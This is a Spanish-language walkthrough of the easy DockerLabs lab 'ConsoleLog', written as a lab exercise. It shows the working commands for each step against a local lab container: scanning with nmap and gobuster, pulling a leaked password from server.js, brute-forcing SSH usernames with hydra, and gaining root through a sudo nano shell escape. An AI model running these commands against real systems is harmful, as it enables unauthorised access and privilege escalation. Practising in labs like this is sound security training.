---
title: "DockerLabs - ConsoleLog"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar el análisis del código fuente y fuzzing para obtener credenciales, fuerza bruta SSH y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh consolelog.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos:

```bash
nmap -sV -p- 172.17.0.2
```

Lanzamos `gobuster` para ver los directorios del target:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,node -t 50
```

Encontramos un directorio `/backend` con todo su contenido accesible.

## Explotación

En un archivo llamado `server.js` encontramos un token y una contraseña. Usaremos esa contraseña para hacer cracking de SSH por usuario:

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p 'lapassworddebackupmaschingonadetodas' ssh://172.17.0.2:5000 -t 4
hydra -L /usr/share/wordlists/rockyou.txt -p 'lapassworddebackupmaschingonadetodas' ssh://172.17.0.2:5000 -t 4
```

Obtenemos un usuario válido y accedemos por SSH:

```bash
ssh lovely@172.17.0.2 -p 5000
```

## Escalada de privilegios

Una vez dentro, usamos `sudo -l` para ver qué rutas o ficheros se pueden ejecutar como root:

```bash
sudo -l
```

Encontramos que `nano` se puede ejecutar como root. Consultando GTFOBins, encontramos cómo abusar de `nano` para escalar privilegios:

```bash
TERM=xterm sudo nano
# Ctrl+R Ctrl+X
reset; sh 1>&0 2>&0
```

## Conclusión

Objetivo logrado: acceso a root conseguido. Laboratorio terminado.
